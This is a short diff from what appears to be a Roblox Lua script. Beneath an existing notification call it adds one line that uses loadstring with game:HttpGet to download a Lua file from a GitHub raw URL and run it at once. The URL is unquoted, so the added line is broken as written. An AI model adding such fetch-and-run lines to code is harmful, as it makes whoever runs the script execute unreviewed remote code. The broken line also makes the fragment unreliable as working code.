@@ -29,5 +29,7 @@ Notification:Notify(
      {Image = "http://www.roblox.com/asset/?id=4483345998", ImageColor = Color3.fromRGB(255, 84, 84)} 
  ) 
 
+loadstring(game:HttpGet(https://raw.githubusercontent.com/tiaow/gb/refs/heads/main/aaaTW脚本.lua))()
+
 end
 
